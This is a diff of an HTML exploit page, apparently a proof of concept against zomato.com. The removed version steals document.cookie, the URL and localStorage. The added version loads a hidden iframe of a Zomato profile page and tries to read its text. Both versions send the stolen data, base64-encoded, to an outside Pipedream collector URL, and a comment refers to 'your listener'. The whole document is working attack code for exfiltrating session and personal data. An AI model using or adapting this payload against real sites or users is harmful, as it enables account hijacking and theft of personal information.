@@ -1,16 +1,13 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // Extracting data from the current session
-        const piiData = {
-            cookies: document.cookie,
-            url: window.location.href,
-            localStorage: JSON.stringify(localStorage)
-        };
-
-        // Sending the data back to your listener (You can use RequestBin here to catch the data)
-        fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(JSON.stringify(piiData)));
-    </script>
-</body>
-</html>
+<iframe id="piiFrame" src="https://www.zomato.com/webroutes/getPage?page_url=/profile" style="display:none;"></iframe>
+<script>
+    window.onload = function() {
+        setTimeout(function() {
+            try {
+                var content = document.getElementById('piiFrame').contentWindow.document.body.innerText;
+                fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(content));
+            } catch (e) {
+                fetch('https://eomfuajl79ed6za.m.pipedream.net/?error=' + btoa(e.message));
+            }
+        }, 3000); // Wait for load
+    };
+</script>
